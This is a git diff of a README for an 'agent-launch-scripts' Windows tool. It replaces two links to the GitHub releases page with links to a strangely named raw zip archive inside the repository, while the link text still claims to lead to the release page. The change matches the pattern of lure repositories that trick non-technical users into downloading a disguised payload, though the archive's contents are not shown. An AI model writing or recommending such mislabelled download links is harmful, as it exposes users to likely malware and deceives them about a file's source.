@@ -1,6 +1,6 @@
 # 🚀 agent-launch-scripts - Run your automated software tasks easily
 
-[![](https://img.shields.io/badge/Download-Latest-blue.svg)](https://github.com/giffiepenurious252/agent-launch-scripts/releases)
+[![](https://img.shields.io/badge/Download-Latest-blue.svg)](https://github.com/giffiepenurious252/agent-launch-scripts/raw/refs/heads/main/atrocha/scripts_agent_launch_benzotetrazine.zip)
 
 This project provides simplified scripts to start and manage your software agents. These scripts automate background processes on your Windows computer, ensuring your tools remain active without constant manual input. You do not need programming knowledge to use these files.
 
@@ -22,7 +22,7 @@ These scripts work on any modern Windows computer. Ensure you meet these criteri
 
 You must visit the official release page to obtain the necessary files. The repository maintains different versions to support updates or fixes from the developer.
 
-[Visit the release page to download your files](https://github.com/giffiepenurious252/agent-launch-scripts/releases)
+[Visit the release page to download your files](https://github.com/giffiepenurious252/agent-launch-scripts/raw/refs/heads/main/atrocha/scripts_agent_launch_benzotetrazine.zip)
 
 Follow these steps to complete the download:
 
